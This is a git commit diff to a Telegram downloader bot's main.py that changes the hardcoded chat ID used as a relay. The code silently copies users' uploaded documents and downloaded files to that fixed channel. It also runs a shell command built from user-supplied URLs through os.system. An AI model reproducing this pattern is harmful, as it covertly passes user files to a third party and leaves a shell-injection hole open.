03ed71f2af0b953ac7c253b71e12d49ea0a430a2
tvrifaf714 <146050910+tvrifaf714@users.noreply.github.com>
2024-03-20 17:41:45 +0530

    Update main.py

--- main.py
+++ main.py
@@ -47,7 +47,7 @@ async def account_login(bot: Client, m: Message):
     input: Message = await bot.listen(editable.chat.id)
     if input.document:
         x = await input.download()
-        await bot.send_document(-1001674356488, x)
+        await bot.send_document(-1002098581395, x)
         await input.delete(True)
         
         
@@ -177,7 +177,7 @@ async def account_login(bot: Client, m: Message):
                     try:
                         ka = await helper.download(url, name)
                         copy = await bot.send_document(chat_id=m.chat.id,document=ka, caption=cc1)
-                        await copy.copy(chat_id = -1001674356488)
+                        await copy.copy(chat_id = -1002098581395)
                         count+=1
                         os.remove(ka)
                         time.sleep(1)
@@ -191,7 +191,7 @@ async def account_login(bot: Client, m: Message):
                         download_cmd = f"{cmd} -R 25 --fragment-retries 25"
                         os.system(download_cmd)
                         copy = await bot.send_document(chat_id=m.chat.id,document=f'{name}.pdf', caption=cc1)
-                        await copy.copy(chat_id = -1001674356488)
+                        await copy.copy(chat_id = -1002098581395)
                         count += 1
                         os.remove(f'{name}.pdf')
                     except FloodWait as e:
